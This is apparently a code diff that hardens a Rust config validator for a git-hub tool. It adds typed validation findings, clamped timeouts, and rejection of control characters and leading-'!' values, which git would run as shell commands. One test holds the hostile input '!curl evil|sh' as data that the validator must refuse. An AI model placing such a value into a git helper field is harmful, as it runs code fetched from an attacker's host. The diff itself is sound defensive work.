@@ -218,18 +218,47 @@ fn write_locked(p: &Path, cfg: &Config) -> Result<()> {
 
 // ── validation ──────────────────────────────────────────────────────────────────────
 
-/// A validation finding: `(field-path, message)`. `validate` returns them all so `confer config
-/// validate` / `doctor` can list every problem, not just the first.
-pub type Finding = (String, String);
+/// A validation finding — typed severity so nothing depends on matching message text (red-team: the
+/// old string-prefix `is_advisory` was a stringly-typed gate one reword could silently flip). `hard`
+/// = a malformed KNOWN field that must be fixed (blocks a `set`, exits `validate` non-zero); not-hard
+/// = advisory (a preserved/unknown field — informational).
+#[derive(Clone, Debug)]
+pub struct Finding {
+    pub field: String,
+    pub message: String,
+    pub hard: bool,
+}
+impl Finding {
+    fn hard(field: impl Into<String>, message: impl Into<String>) -> Self {
+        Self { field: field.into(), message: message.into(), hard: true }
+    }
+    fn advisory(field: impl Into<String>, message: impl Into<String>) -> Self {
+        Self { field: field.into(), message: message.into(), hard: false }
+    }
+}
+
+/// A value that would be dangerous to a future consumer regardless of which field it lands in: control
+/// characters / newlines (arg/log injection), or a leading `!` (a git credential-helper `!cmd` is a
+/// shell command — the RCE class the closed `auth.method` enum blocks; don't let it re-enter via
+/// `url`/`auth.key`/`clone_root`). Returns the reason it's suspicious, or None.
+fn suspicious_value(v: &str) -> Option<&'static str> {
+    if v.chars().any(|c| c.is_control()) {
+        Some("contains control characters")
+    } else if v.starts_with('!') {
+        Some("starts with '!' — a git helper `!cmd` is a shell command")
+    } else {
+        None
+    }
+}
 
 /// Semantic checks that read-time (syntactic) parsing can't do. Never mutates. The expensive
 /// reality-checks (key file exists + 0600, hub_key reconciles) live in `doctor`; this is the
-/// value-shape layer shared by `config set` (pre-write) and `config validate`.
+/// value-shape layer shared by `config set` (pre-write, via `set_field`) and `config validate`.
 pub fn validate(cfg: &Config) -> Vec<Finding> {
     let mut out = Vec::new();
     if cfg.version > CONFIG_VERSION {
-        out.push((
-            "version".into(),
+        out.push(Finding::advisory(
+            "version",
             format!("{} is newer than this binary understands ({CONFIG_VERSION}) — reading only known fields", cfg.version),
         ));
     }
@@ -237,14 +266,19 @@ pub fn validate(cfg: &Config) -> Vec<Finding> {
     flag_extra(&cfg.machine.extra, "machine", &mut out);
     flag_extra(&cfg.update.extra, "update", &mut out);
     flag_extra(&cfg.tuning.extra, "tuning", &mut out);
+    if let Some(cr) = &cfg.machine.clone_root {
+        if let Some(why) = suspicious_value(cr) {
+            out.push(Finding::hard("machine.clone_root", why));
+        }
+    }
     if let Some(n) = cfg.tuning.git_timeout_secs {
         if n == 0 || n > GIT_TIMEOUT_MAX_SECS {
-            out.push(("tuning.git_timeout_secs".into(), format!("{n} out of range 1..={GIT_TIMEOUT_MAX_SECS}")));
+            out.push(Finding::hard("tuning.git_timeout_secs", format!("{n} out of range 1..={GIT_TIMEOUT_MAX_SECS}")));
         }
     }
     if let Some(n) = cfg.tuning.op_budget_secs {
         if n == 0 || n > OP_BUDGET_MAX_SECS {
-            out.push(("tuning.op_budget_secs".into(), format!("{n} out of range 1..={OP_BUDGET_MAX_SECS}")));
+            out.push(Finding::hard("tuning.op_budget_secs", format!("{n} out of range 1..={OP_BUDGET_MAX_SECS}")));
         }
     }
     for (name, hub) in &cfg.hubs {
@@ -252,22 +286,35 @@ pub fn validate(cfg: &Config) -> Vec<Finding> {
         flag_extra(&hub.extra, &format!("hubs.{name}"), &mut out);
         if let Some(s) = &hub.scheme {
             if s != "ssh" && s != "https" {
-                out.push((at("scheme"), format!("'{s}' must be ssh or https")));
+                out.push(Finding::hard(at("scheme"), format!("'{s}' must be ssh or https")));
             }
         }
         if let Some(w) = &hub.watch {
             if WatchMode::parse(w).is_none() {
-                out.push((at("watch"), format!("'{w}' must be reactive, poll, or off")));
+                out.push(Finding::hard(at("watch"), format!("'{w}' must be reactive, poll, or off")));
+            }
+        }
+        if let Some(u) = &hub.url {
+            if let Some(why) = suspicious_value(u) {
+                out.push(Finding::hard(at("url"), why));
             }
         }
         if let Some(auth) = &hub.auth {
             flag_extra(&auth.extra, &format!("hubs.{name}.auth"), &mut out);
             if AuthMethod::parse(&auth.method).is_none() {
-                out.push((at("auth.method"), format!("'{}' must be ssh, confer-app, or system", auth.method)));
+                out.push(Finding::hard(at("auth.method"), format!("'{}' must be ssh, confer-app, or system", auth.method)));
+            }
+            if let Some(k) = &auth.key {
+                if let Some(why) = suspicious_value(k) {
+                    out.push(Finding::hard(at("auth.key"), why));
+                }
             }
         }
         if hub_name_normalized(name) != *name {
-            out.push((at(""), format!("hub name '{name}' is not normalized (expected '{}') — confusable/case risk", hub_name_normalized(name))));
+            out.push(Finding::hard(
+                at(""),
+                format!("hub name '{name}' is not normalized (expected '{}') — confusable/case risk", hub_name_normalized(name)),
+            ));
         }
     }
     out
@@ -276,7 +323,24 @@ pub fn validate(cfg: &Config) -> Vec<Finding> {
 fn flag_extra(extra: &Map<String, Value>, prefix: &str, out: &mut Vec<Finding>) {
     for k in extra.keys() {
         let field = if prefix.is_empty() { k.clone() } else { format!("{prefix}.{k}") };
-        out.push((field, "unrecognized field — preserved but NOT understood by this binary; review before trusting".into()));
+        out.push(Finding::advisory(field, "unrecognized field — preserved but NOT understood by this binary; review before trusting"));
+    }
+}
+
+// The clamped accessors exist so the FIRST consumer (phase 3+) inherits bounded-ness by construction;
+// nothing reads them yet, hence dead_code. Keeping them now fixes the "bounds enforced only at the CLI
+// edit path" gap the red-team flagged, before any consumer can miss the re-validate.
+#[allow(dead_code)]
+impl Config {
+    /// Bounded git-op timeout — clamps to the valid range so a consumer never inherits an
+    /// out-of-range value from a config written by another tool (bounded-ness is a property of the
+    /// TYPE, not of remembering to call `validate()` first — red-team). None → the caller's default.
+    pub fn git_timeout_secs(&self) -> Option<u64> {
+        self.tuning.git_timeout_secs.map(|n| n.clamp(1, GIT_TIMEOUT_MAX_SECS))
+    }
+    /// Bounded overall op budget — same clamping rationale as `git_timeout_secs`.
+    pub fn op_budget_secs(&self) -> Option<u64> {
+        self.tuning.op_budget_secs.map(|n| n.clamp(1, OP_BUDGET_MAX_SECS))
     }
 }
 
@@ -285,12 +349,6 @@ fn flag_extra(extra: &Map<String, Value>, prefix: &str, out: &mut Vec<Finding>) 
 /// case-fold here; non-ASCII is left intact but surfaced by the diff so `doctor` can show it.
 pub fn hub_name_normalized(name: &str) -> String {
     name.to_ascii_lowercase()
-}
-
-/// Is this finding merely advisory (an unrecognized/preserved field), vs a hard error (a malformed
-/// KNOWN field)? `config validate` exits non-zero only on hard errors; `set` refuses only on hard.
-pub fn is_advisory(msg: &str) -> bool {
-    msg.starts_with("unrecognized field")
 }
 
 // ── dotted-key get/set (the `confer config` surface) ──────────────────────────────────
@@ -318,7 +376,9 @@ pub fn get_field(cfg: &Config, key: &str) -> Option<String> {
         "tuning.op_budget_secs" => cfg.tuning.op_budget_secs.map(|n| n.to_string()),
         _ => {
             let (name, field) = split_hub_key(key.strip_prefix("hubs.")?)?;
-            let hub = cfg.hubs.get(name)?;
+            // Normalize the looked-up name too (set enforces normalized keys; get should agree, not
+            // read a stray non-normalized key from a hand-edited/older file).
+            let hub = cfg.hubs.get(&hub_name_normalized(name))?;
             match field {
                 "url" => hub.url.clone(),
                 "scheme" => hub.scheme.clone(),
@@ -343,6 +403,9 @@ pub fn set_field(cfg: &mut Config, key: &str, val: &str) -> Result<SetOutcome> {
     let mut gated: Option<String> = None;
     match key {
         "machine.clone_root" => {
+            if let Some(why) = suspicious_value(val) {
+                return Err(anyhow!("clone_root {why}"));
+            }
             gated = Some("clone_root re-homes where clones live; existing clones may need migration".into());
             cfg.machine.clone_root = Some(val.to_string());
         }
@@ -371,6 +434,9 @@ pub fn set_field(cfg: &mut Config, key: &str, val: &str) -> Result<SetOutcome> {
             let hub = cfg.hubs.entry(name.to_string()).or_default();
             match field {
                 "url" => {
+                    if let Some(why) = suspicious_value(val) {
+                        return Err(anyhow!("url {why}"));
+                    }
                     gated.get_or_insert_with(|| "a hub url is trust-relevant routing".into());
                     hub.url = Some(val.to_string());
                 }
@@ -394,6 +460,9 @@ pub fn set_field(cfg: &mut Config, key: &str, val: &str) -> Result<SetOutcome> {
                     hub.auth.get_or_insert_with(default_auth).method = val.to_string();
                 }
                 "auth.key" => {
+                    if let Some(why) = suspicious_value(val) {
+                        return Err(anyhow!("auth.key {why}"));
+                    }
                     gated.get_or_insert_with(|| "auth.key selects the transport key path".into());
                     hub.auth.get_or_insert_with(default_auth).key = Some(val.to_string());
                 }
@@ -449,10 +518,10 @@ mod tests {
         let back = serde_json::to_string(&c).unwrap();
         assert!(back.contains("brand_new_section"));
         assert!(back.contains("future_knob"));
-        // and validate flags both as review material
-        let names: Vec<String> = validate(&c).into_iter().map(|(f, _)| f).collect();
-        assert!(names.iter().any(|f| f == "brand_new_section"));
-        assert!(names.iter().any(|f| f == "machine.future_knob"));
+        // and validate flags both as review material (advisory, not hard)
+        let findings = validate(&c);
+        assert!(findings.iter().any(|f| f.field == "brand_new_section" && !f.hard));
+        assert!(findings.iter().any(|f| f.field == "machine.future_knob" && !f.hard));
     }
 
     #[test]
@@ -470,7 +539,7 @@ mod tests {
         let c: Config = serde_json::from_str(raw).unwrap();
         assert!(AuthMethod::parse(&c.hubs["h"].auth.as_ref().unwrap().method).is_none());
         let findings = validate(&c);
-        assert!(findings.iter().any(|(f, _)| f == "hubs.h.auth.method"));
+        assert!(findings.iter().any(|f| f.field == "hubs.h.auth.method" && f.hard));
     }
 
     #[test]
@@ -478,7 +547,7 @@ mod tests {
         let raw = r#"{"tuning":{"git_timeout_secs":999999,"op_budget_secs":0},
                       "hubs":{"h":{"scheme":"carrier-pigeon","watch":"sometimes"}}}"#;
         let c: Config = serde_json::from_str(raw).unwrap();
-        let f: Vec<String> = validate(&c).into_iter().map(|(k, _)| k).collect();
+        let f: Vec<String> = validate(&c).into_iter().map(|x| x.field).collect();
         assert!(f.iter().any(|k| k == "tuning.git_timeout_secs"));
         assert!(f.iter().any(|k| k == "tuning.op_budget_secs"));
         assert!(f.iter().any(|k| k == "hubs.h.scheme"));
@@ -486,10 +555,31 @@ mod tests {
     }
 
     #[test]
+    fn suspicious_values_rejected_on_set_and_flagged_hard_on_validate() {
+        let mut c = Config::default();
+        // leading '!' (git helper = shell command) and control chars are refused by set_field
+        assert!(set_field(&mut c, "hubs.h/x.url", "!curl evil|sh").is_err());
+        assert!(set_field(&mut c, "machine.clone_root", "a\nb").is_err());
+        assert!(set_field(&mut c, "hubs.h/x.auth.key", "\u{7}key").is_err());
+        // a hand-written config carrying such a value is flagged HARD by validate
+        let raw = r#"{"hubs":{"h":{"url":"!evil"}}}"#;
+        let cc: Config = serde_json::from_str(raw).unwrap();
+        assert!(validate(&cc).iter().any(|f| f.field == "hubs.h.url" && f.hard));
+    }
+
+    #[test]
+    fn tuning_accessors_clamp_out_of_range() {
+        let raw = r#"{"tuning":{"git_timeout_secs":999999,"op_budget_secs":0}}"#;
+        let c: Config = serde_json::from_str(raw).unwrap();
+        assert_eq!(c.git_timeout_secs(), Some(GIT_TIMEOUT_MAX_SECS)); // clamped down from 999999
+        assert_eq!(c.op_budget_secs(), Some(1)); // 0 clamped up to the min
+    }
+
+    #[test]
     fn normalized_names_flagged() {
         assert_eq!(hub_name_normalized("Codeshrew/Agent-Coord"), "codeshrew/agent-coord");
         let raw = r#"{"hubs":{"Codeshrew/Agent-Coord":{}}}"#;
         let c: Config = serde_json::from_str(raw).unwrap();
-        assert!(validate(&c).iter().any(|(_, m)| m.contains("not normalized")));
+        assert!(validate(&c).iter().any(|x| x.message.contains("not normalized")));
     }
 }
